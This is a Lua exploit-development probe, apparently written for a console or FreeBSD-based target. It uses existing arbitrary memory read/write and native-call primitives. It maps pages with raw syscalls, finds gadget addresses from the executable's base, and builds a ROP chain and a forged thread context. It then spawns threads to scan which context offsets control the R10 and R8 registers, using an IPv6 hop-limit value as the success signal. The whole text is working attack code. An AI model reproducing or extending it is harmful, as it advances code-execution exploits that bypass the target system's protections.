-- CRASH_CLASS: LOW
-- PROBE 91r: R10/R8 offset scan — ZERO memory.alloc
--
-- Root cause: memory.alloc returns addresses that alias Lua VM state.
-- Writing context values (0x480, 0x43, 0x3B) to those addresses
-- corrupts the VM's output buffer, producing binary garbage.
--
-- Fix: ALL buffers in three SEPARATE mmap regions. No memory.alloc.
-- Child does NO userland writes (setsockopt then nanosleep).
-- Test: set UNICAST_HOPS=42 from main, child tries to set to 77.

print("=== PROBE 91r: R10 ZERO-MALLOC ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local tk=mk(433)

-- Three SEPARATE mmaps (16KB each)
local pg=0x4000
local ok1,data=pcall(function()
    return mm(uint64(0),uint64(pg),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
local ok2,stack=pcall(function()
    return mm(uint64(0),uint64(pg),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
local ok3,ctxpg=pcall(function()
    return mm(uint64(0),uint64(pg),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not(ok1 and ok2 and ok3) then print("MMAP FAIL") return end
local D=N(data); local S=N(stack); local C=N(ctxpg)
print(string.format("data=%X stk=%X ctx=%X",D,S,C))

-- Data page layout:
-- +0x000: inf buffer (0x200 bytes) for dynlib_get_info
-- +0x200: optval (4 bytes) = 77
-- +0x210: vb (4 bytes) for set_hops
-- +0x220: gb (8 bytes) for get_hops
-- +0x230: gl (4 bytes) for get_hops optlen
-- +0x240: ts (16 bytes) nanosleep 999s
-- +0x260: sl (16 bytes) short sleep 50ms
-- +0x280: tb (8 bytes) thr_create output
local inf=D; local optval=D+0x200; local vb=D+0x210
local gb=D+0x220; local gl=D+0x230; local ts=D+0x240
local sl=D+0x260; local tb=D+0x280

-- Init fixed data
wd(optval,77)
wq(ts,uint64(999)); wq(ts+8,uint64(0))
wq(sl,uint64(0)); wq(sl+8,uint64(50000000))

-- Get eboot base (using mmap'd inf buffer)
z(inf,0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),uint64(inf)) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
print("eb="..string.format("0x%X%08X",ehi,elo))

-- Known ctx offsets
local _DI=0x048;local _SI=0x050;local _DX=0x058;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

-- Create IPv6 socket
local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("NO IPv6") return end

-- set/get hops using mmap'd buffers (NO memory.alloc)
local function set_hops(val)
    wd(vb,val)
    native.fcall_with_rax(stub,105,s6,41,4,vb,4)
end
local function get_hops()
    wd(gb,0); wd(gb+4,0); wd(gl,4)
    native.fcall_with_rax(stub,118,s6,41,4,gb,gl)
    return rd(gb)
end

set_hops(42)
local h0=get_hops()
print("baseline="..tostring(h0))

-- ============================================================
-- Test function: one child per call
-- ============================================================
local function test(r10_off, r8_off, label)
    set_hops(42)

    -- Build ROP on stack page: setsockopt → nanosleep (NO writes)
    z(S,0x80)
    local sp=S
    wq(sp,PRDI); sp=sp+8
    wq(sp,uint64(ts)); sp=sp+8
    wq(sp,PRAX); sp=sp+8
    wq(sp,uint64(240)); sp=sp+8
    wq(sp,SA); sp=sp+8

    -- Build context on ctx page
    z(C,0x200)
    wq(C+_MG,uint64(0x480)); wd(C+_FL,0)
    wq(C+_TP,uint64(0x10000))
    wq(C+_CS,uint64(0x43)); wq(C+_SS,uint64(0x3B))
    wq(C+_IP,SA)
    wq(C+_SP,uint64(S))
    wq(C+_AX,uint64(105))
    wq(C+_DI,uint64(s6))
    wq(C+_SI,uint64(41))
    wq(C+_DX,uint64(4))
    wq(C+r10_off,uint64(optval))
    if r8_off~=r10_off then
        wq(C+r8_off,uint64(4))
    end

    -- Spawn
    wq(tb,uint64(0))
    pcall(function() tc(uint64(C),uint64(tb),uint64(0)) end)
    local tid=rq(tb)

    -- Wait 50ms
    native.fcall_with_rax(stub,240,sl,0)

    -- Check hops
    local hops=get_hops()
    local hit=(hops==77)

    -- Kill child
    if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end

    local tag=""
    if hit then tag=" ***HIT***" end
    print(string.format("  %s h=%s%s",label,tostring(hops),tag))
    return hit
end

-- ============================================================
-- Phase 1: Standard
-- ============================================================
print("")
print("=P1=")
local found=test(0x090,0x068,"std")

-- ============================================================
-- Phase 2: Scan R10
-- ============================================================
if not found then
    print("=P2=")
    local c={0x060,0x068,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r in ipairs(c) do
        found=test(r,0x068,string.format("%03X",r))
        if found then break end
    end
end

-- ============================================================
-- Phase 3: Scan R8
-- ============================================================
if not found then
    print("=P3=")
    local c={0x060,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r in ipairs(c) do
        found=test(0x090,r,string.format("%03X",r))
        if found then break end
    end
end

-- ============================================================
-- Phase 4: Cross matrix
-- ============================================================
if not found then
    print("=P4=")
    local all={0x060,0x068,0x070,0x080,0x088,0x090,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r10 in ipairs(all) do
        for _,r8 in ipairs(all) do
            if r10~=r8 then
                found=test(r10,r8,string.format("%03X/%03X",r10,r8))
                if found then break end
            end
        end
        if found then break end
    end
end

if not found then
    print("")
    print("*** NO R10/R8 FOUND ***")
end

print("")
native.fcall_with_rax(stub,6,s6)
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91r DONE ===")
